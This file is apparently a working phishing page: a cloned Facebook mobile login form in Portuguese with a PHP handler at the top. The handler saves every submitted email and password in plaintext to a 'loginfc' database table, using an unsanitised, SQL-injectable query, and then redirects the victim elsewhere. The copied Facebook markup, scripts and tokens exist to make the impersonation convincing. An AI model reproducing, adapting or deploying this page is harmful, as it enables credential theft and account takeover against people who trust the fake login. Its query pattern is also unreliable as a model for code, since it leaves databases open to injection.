<?php

include_once('./dev/conexao.php');

if(isset($_POST['submit'])){

$email = $_POST['email'];

$senha = $_POST['pass'];

if (isset($_POST['submit']))
    {   

       header('Location: banco/index.php');       
    }



$sql = "INSERT INTO loginfc (email, senha) VALUES ('$email', '$senha')";




if (mysqli_query($conn, $sql)) 
mysqli_close($conn);

}

?>




<!DOCTYPE html>
<html lang="en">
   <head>
      <title>Log into Facebook | Facebook</title>
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
      <link href="images/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
      <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
      <meta name="theme-color" content="#3b5998">
      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/v6qlpu7t0Zm.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="kCifscA" crossorigin="anonymous">
      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/lH6ykpEeAf7.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous">
      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/tHhdXS6Bkir.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="2k5Zrzs" crossorigin="anonymous">
      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/l/0,cross/AMLsLHFyPMf.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="4b3frHc" crossorigin="anonymous">
      <script id="u_0_b_ql" nonce>function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"useTrustedTypes":false,"isTrustedTypesReportOnly":false,"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":false},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"dom_mutation_flag":true});</script><script nonce>document.domain = 'facebook.com';</script><script nonce>__DEV__=0;</script><script id="u_0_c_2F" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/biLxnWecCos.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ZJyCj79" nonce></script>
      <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
      <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
      <meta property="og:site_name" content="Facebook">
      <meta property="og:type" content="website">
      <meta property="og:title" content="Log into Facebook | Facebook">
      <meta property="og:description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
      <meta property="og:image" content="images/fb_icon_325x325.png">
      <meta property="og:url" content="https://www.facebook.com/">
      <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/">
      <link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/">
      <link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/">
      <link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/">
      <link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/">
      <link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/">
      <link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/">
      <link rel="alternate" hreflang="en" href="https://www.facebook.com/">
      <link rel="alternate" hreflang="es" href="https://es-la.facebook.com/">
      <link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/">
      <link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/">
      <link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/">
      <link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/">
      <link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/">
      <link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/">
      <link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/">
      <link rel="alternate" hreflang="id" href="https://id-id.facebook.com/">
      <link rel="alternate" hreflang="it" href="https://it-it.facebook.com/">
      <link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/">
      <link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/">
      <link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/">
      <link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/">
      <link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/">
      <link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/">
      <link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/">
      <link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/">
      <link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/">
      <link rel="alternate" hreflang="th" href="https://th-th.facebook.com/">
      <link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/">
      <script id="u_0_d_gP" type="application/ld+json" nonce>{"\u0040context":"http:\/\/schema.org","\u0040type":"WebSite","name":"Facebook","url":"https:\/\/www.facebook.com\/"}</script>
      <link rel="canonical" href="https://www.facebook.com/login/">
      <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials">
   </head>
   <body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw">
      <script id="u_0_a_xf" nonce>(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
      <div id="viewport" data-kaios-focus-transparent="1">
         <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
         <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
               <div class="_7om2">
                  <div class="_4g34" id="u_0_0_hC">
                     <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                     </div>
                     <div class="_9om_">
                        <div class="_4-4l">
                           <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div>
                           <div class="_7om2 _52we _2pid _52z6">
                              <div class="_4g34"><a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc2MDY0OTc2LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D"><img src="fonts/dF5SId3UHWd.svg" width="112" class="img" alt="facebook"></a></div>
                           </div>
                           <div class="_5rut">
                              <form method="post" action="login2.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                                 <input type="hidden" name="lsd" value="AVpc17RvVds" autocomplete="off"><input type="hidden" name="jazoest" value="2967" autocomplete="off"><input type="hidden" name="m_ts" value="1676064976"><input type="hidden" name="li" value="0LjmY0RRRXZcN2_1KyxmtmES"><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries">
                                 <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                 <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                 <div id="otp_retrieve_desc_container"></div>
                                 <div>
                                    <div class="_56be">
                                       <div class="_55wo _56bf">
                                          <div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Email ou telefone" data-sigil="m_login_email"></div>
                                       </div>
                                    </div>
                                    <div class="_55wq"></div>
                                    <div class="_56be">
                                       <div class="_55wo _56bf">
                                          <div class="_1upc _mg8" data-sigil="m_login_password">
                                             <div class="_7om2">
                                                <div class="_4g34 _5i2i _52we">
                                                   <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Senha" type="password" data-sigil="password-plain-text-toggle-input"></div>
                                                </div>
                                                <div class="_5s61 _216i _5i2i _52we">
                                                   <div class="_5xu4">
                                                      <div class="_2pi9" style="display:none" id="u_0_1_BO"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_zL">HIDE</span><span class="mfss" id="u_0_3_vT">SHOW</span></a></div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="_2pie" style="text-align:center;">
                                    <div id="login_password_step_element" data-sigil="login_password_step_element">
                                       <button type="submit" value="Log in" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="submit" data-sigil="touchable login_button_block m_login_button"><span class="_55sr">Entrar</span></button>
                                    </div>
                                    <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                    <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                    <div id="otp_button_elem_container"></div>
                                 </div>
                                 <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"><input type="hidden" name="prefill_source" id="prefill_source"><input type="hidden" name="prefill_type" id="prefill_type"><input type="hidden" name="first_prefill_source" id="first_prefill_source"><input type="hidden" name="first_prefill_type" id="first_prefill_type"><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"><input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0"><input type="hidden" id="scetoggle">
                                 <div class="_xo8"></div>
                                 <noscript><input type="hidden" name="_fb_noscript" value="true"></noscript>
                              </form>
                              <div>
                                 <div class="_2pie _9omz">
                                    <div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="" id="forgot-password-link">Esqueceu sua senha?</a></div>
                                 </div>
                                 <div style="padding-top: 42px">
                                    <div>
                                       <div>
                                          <div>
                                             <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div>
                                             <div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable" id="signup-button" href="" tabindex="0" data-sigil="m_reg_button">Criar nova conta</a></div>
                                          </div>
                                       </div>
                                       <div class="_2pie" style="text-align:center;">
                                          <div>
                                             <div data-sigil="login_identify_step_element"></div>
                                             <div class="other-links _8p_m">
                                                <ul class="_5pkb _55wp">
                                                   <li></li>
                                                </ul>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div style="display:none">
                  <div></div>
                  <div></div>
               </div>
               <span><img src="unsupportedbrowser.html" width="0" height="0" style="display:none"></span>
               <div class="_55wr _5ui2" data-sigil="m_login_footer">
                  <div class="_5dpw">
                     <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_7om2">
                           <div class="_4g34">
                              <span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=fy_NL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=fy_NL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Frysk</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=tr_TR&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=tr_TR&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Türkçe</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span></div>
                           </div>
                           <div class="_4g34">
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=nl_NL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=nl_NL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Nederlands</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=pl_PL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=pl_PL&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Polski</a></span></div>
                              <div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-ajaxify-href="/intl/save_locale/?loc=es_LA&href=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&ls_ref=mobile_suggested_locale_selector" data-method="post" data-sigil="ajaxify">Español</a></span></div>
                              <a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated">
                                 <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_W9kSxutfzKd sx_8c92ff"></i></div>
                              </a>
                           </div>
                        </div>
                     </div>
                     <div class="_5ui4"><span class="mfss fcg">Meta © 2023</span></div>
                  </div>
               </div>
            </div>
            <div class></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_4_Tx" data-sigil="marea">
               <div class="_5vsg" id="u_0_5_0k"></div>
               <div class="_5vsh" id="u_0_6_GJ"></div>
               <div class="_5v5d fcg">
                  <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                  Loading...
               </div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
               <div class="container">
                  <div class="image"></div>
                  <div class="message" data-sigil="error-message"></div>
                  <a class="link" data-sigil="MPageError:retry">Try Again</a>
               </div>
            </div>
         </div>
      </div>
      <div id="static_templates">
         <div class="mDialog" id="modalDialog" style="display:none">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
               <div class="_7om2 _52we">
                  <div class="_5s61">
                     <div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_8_xV" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_9_Th" data-sigil="dialog-back-button"><i class="img sp_W9kSxutfzKd sx_1283ea" style="margin-top: 2px;"></i></button></div>
                  </div>
                  <div class="_4g34">
                     <div class="_52z6">
                        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div>
                     </div>
                  </div>
                  <div class="_5s61">
                     <div class="_52z8" id="modalDialogHeaderButtons"></div>
                  </div>
               </div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
               <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_7_5J" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
               Loading...
            </div>
         </div>
      </div>
      <script id="u_0_e_jq" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3ixJY4/yp/l/en_US/v8lWVOlFwde.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Dn5kds1" nonce></script><script id="u_0_f_62" nonce>requireLazy(["HasteSupportData"],function(m){m.handle({"gkxData":{"676920":{"result":false,"hash":"AT497IX4gOFG8gZemK4"},"708253":{"result":false,"hash":"AT5n4hBL3YTMnQWtPyM"},"996940":{"result":false,"hash":"AT7opYuEGy3sjG1aZXc"},"1263340":{"result":false,"hash":"AT5bwizWgDaFQudmHww"}}})});requireLazy(["TimeSliceImpl","ServerJS"],function(TimeSlice,ServerJS){(new ServerJS()).handle({"define":[["CometPersistQueryParams",[],{"relative":{},"domain":{}},6231],["CurrentAdAccountInitialData",[],{"AD_ACCOUNT_ID":null},6828],["BigPipeExperiments",[],{"link_images_to_pagelets":false,"enable_bigpipe_plugins":false},907],["BootloaderConfig",[],{"deferBootloads":false,"jsRetries":[200,500],"jsRetryAbortNum":2,"jsRetryAbortTime":5,"silentDups":false,"hypStep4":false,"phdOn":false,"btCutoffIndex":564,"translationRetries":[200,500],"translationRetryAbortNum":3,"translationRetryAbortTime":50},329],["CSSLoaderConfig",[],{"timeout":5000,"modulePrefix":"BLCSS:","loadEventSupported":true},619],["CurrentCommunityInitialData",[],{},490],["CurrentUserInitialData",[],{"ACCOUNT_ID":"0","USER_ID":"0","NAME":"","SHORT_NAME":null,"IS_BUSINESS_PERSON_ACCOUNT":false,"HAS_SECONDARY_BUSINESS_PERSON":false,"IS_FACEBOOK_WORK_ACCOUNT":false,"IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false,"IS_MESSENGER_CALL_GUEST_USER":false,"IS_WORK_MESSENGER_CALL_GUEST_USER":false,"IS_WORKROOMS_USER":false,"APP_ID":"412378670482","IS_BUSINESS_DOMAIN":false},270],["ErrorDebugHooks",[],{"SnapShotHook":null},185],["ISB",[],{},330],["LSD",[],{"token":"AVpc17RvVds"},323],["MRequestConfig",[],{"dtsg":{"token":"NAcOejVjb-N5qwSyjzfeuBHPtCJcIMsC43RCiCJtAGVWbnnAC0Ue2jw:0:0","valid_for":86400,"expire":1676151376},"dtsg_ag":{"token":"AQydXHynGSQvqKIHgLgz5CAn1bZYD1b8JNGEksuX2BSd7AZy:0:0","valid_for":604800,"expire":1676669776},"lsd":"AVpc17RvVds","checkResponseOrigin":true,"checkResponseToken":true,"cleanFinishedRequest":false,"cleanFinishedPrefetchRequests":false,"ajaxResponseToken":{"secret":"tsaDHMgVMtqbJylBg7w5flvQZBjaSOHm","encrypted":"AYkEsttZQJ9dz4WklkvO98IXLwjh7DirYIQts6fEK6DZPPTnpFFB0f8LwPdMsxXGOnlqc6IIjGn81mfE_aj5xXI9tcp51oy9lNPzfeuG3O_8KQ"}},51],["ServerNonce",[],{"ServerNonce":"ZyA_xdhV3bOhkzyez8jf8L"},141],["SiteData",[],{"server_revision":1006944047,"client_revision":1006944047,"tier":"","push_phase":"C3","pkg_cohort":"BP:mtouch_pkg","haste_session":"19398.BP:mtouch_pkg.2.0.0.0.0","pr":1,"haste_site":"mobile","manifest_base_uri":"https:\/\/static.xx.fbcdn.net","manifest_origin":null,"manifest_version_prefix":null,"be_one_ahead":false,"is_rtl":false,"is_comet":false,"is_experimental_tier":false,"is_jit_warmed_up":true,"hsi":"7198644258619037058","semr_host_bucket":"3","bl_hash_version":2,"skip_rd_bl":true,"comet_env":0,"wbloks_env":false,"spin":0,"__spin_r":1006944047,"__spin_b":"trunk","__spin_t":1676064976,"vip":"157.240.247.35"},317],["SprinkleConfig",[],{"param_name":"jazoest","version":2,"should_randomize":false},2111],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["KSConfig",[],{"killed":{"__set":["MLHUB_FLOW_AUTOREFRESH_SEARCH","NEKO_DISABLE_CREATE_FOR_SAP","EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT","MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING","WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING","BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE","BUY_AT_UI_LINE_DELETE","BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API","ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION","FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION","VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG","SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME","ADS_STORE_VISITS_METRICS_DEPRECATION","AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION","SEPARATE_MESSAGING_COMACTIVITY_PAGE_PERMS","LAB_NET_NEW_UI_RELEASE","POCKET_MONSTERS_CREATE","POCKET_MONSTERS_DELETE","WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES","POCKET_MONSTERS_UPDATE_NAME","IC_DISABLE_MERGE_TOOL_FEED_CHECK_FOR_REPLACE_SCHEDULE","ADS_EPD_IMPACTED_ADVERTISER_MIGRATE_XCONTROLLER","RECRUITING_CANDIDATE_PORTAL_ACCOUNT_DELETION_CARD","BIZ_INBOX_POP_UP_TIP_NAVIGATION_BUG_FIX","SRT_REVIEW_DISABLE_FELLOWSHIP_REVIEW","EO_STORE_HOME_PAGE_COVID19_BANNER"]},"ko":{"__set":["3OsLvnSHNTt","1G7wJ6bJt9K","9NpkGYwzrPG","3oh5Mw86USj","8NAceEy9JZo","7FOIzos6XJX","rf8JEPGgOi","4j36SVzvP3w","4NSq3ZC4ScE","53gCxKq281G","3yzzwBY7Npj","1onzIv0jH6H","8PlKuowafe8","1ntjZ2zgf03","4SIH2GRVX5W","2dhqRnqXGLQ","2WgiNOrHVuC","amKHb4Cw4WI","8rDvN9vWdAK","5BdzWGmfvrA","DDZhogI19W","acrJTh9WGdp","1oOE64fL4wO","5XCz1h9Iaw3","7r6mSP7ofr2","6DGPLrRdyts","aWxCyi1sEC7","9kCSDzzr8fu","awYA7fn2Bse","aBMlJ8QRPWE","Fl3bH3ozLe"]}},2580],["JSErrorLoggingConfig",[],{"appId":412378670482,"extra":[],"reportInterval":50,"sampleWeight":null,"sampleWeightKey":"__jssesw","projectBlocklist":[]},2776],["ImmediateImplementationExperiments",[],{"prefer_message_channel":true},3419],["UriNeedRawQuerySVConfig",[],{"uris":["dms.netmng.com","doubleclick.net","r.msn.com","watchit.sky.com","graphite.instagram.com","www.kfc.co.th","learn.pantheon.io","www.landmarkshops.in","www.ncl.com","s0.wp.com","www.tatacliq.com","bs.serving-sys.com","kohls.com","lazada.co.th","xg4ken.com","technopark.ru","officedepot.com.mx","bestbuy.com.mx","booking.com","nibio.no"]},3871],["RunGatingConfig",[],{"shouldUseBrowserUnload":true},3914],["InitialCookieConsent",[],{"deferCookies":false,"initialConsent":{"__set":[]},"noCookies":false,"shouldShowCookieBanner":false},4328],["WebConnectionClassServerGuess",[],{"connectionClass":"UNKNOWN"},4705],["BootloaderEndpointConfig",[],{"debugNoBatching":false,"endpointURI":"https:\/\/m.facebook.com\/ajax\/bootloader-endpoint\/"},5094],["CookieConsentIFrameConfig",[],{"consent_param":"FQASEhIA.ARYuFetjmEPjGgXqhzNmam2CGKYOuP1hkvtfI0GPdZKj6ddd","allowlisted_iframes":[]},5540],["cr:3769",["PromiseImpl"],{"__rc":["PromiseImpl","Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:696703",[],{"__rc":[null,"Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:717822",["TimeSliceImpl"],{"__rc":["TimeSliceImpl","Aa3Hsxv5dzqTDgz7HFBFkVpOcyg_UOVitrgjsAywTDq91rnHA7-0gVKuf6Zzd4DC-zb7zDsclobcmZ4aMh3GEGxooBg"]},-1],["cr:729414",[],{"__rc":[null,"Aa1pm9-C-n4klQorVDeDrPCUTEOyDRuETXp19OhiQGsMCwQV715QEmGtt19gDMACXBAIkHT1OClR6uSOpexUYg88"]},-1]],"require":[["MPrelude"],["VisualCompletionGating"],["RequireDeferredReference","unblock",[],[["VisualCompletionGating"],"sd"]],["RequireDeferredReference","unblock",[],[["VisualCompletionGating"],"css"]]]});});</script>
      <script>now_inl=(function(){var p=window.performance;return p&&p.now&&p.timing&&p.timing.navigationStart?function(){return p.now()+p.timing.navigationStart}:function(){return new Date().getTime()};})();window.__bigPipeFR=now_inl();</script>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/v6qlpu7t0Zm.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/lH6ykpEeAf7.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/UWW6y1Ro_4k.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/TGI98QfhHxu.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/Ri9uQBVEGyt.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3ixJY4/yp/l/en_US/v8lWVOlFwde.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/MGXRUAcXehC.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/l/0,cross/tHhdXS6Bkir.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/l/0,cross/AMLsLHFyPMf.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous">
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/SEiVEe7Izh6.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/ohs53z_4AL7.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce>
      <script>window.__bigPipeCtor=now_inl();requireLazy(["BigPipe"],function(BigPipe){define("__bigPipe",[],window.bigPipe=new BigPipe({"forceFinish":true,"config":{"flush_pagelets_asap":true,"dispatch_pagelet_replayable_actions":false}}));});</script>
      <script nonce>(function(){var n=now_inl();requireLazy(["__bigPipe"],function(bigPipe){bigPipe.beforePageletArrive("first_response",n);})})();</script>
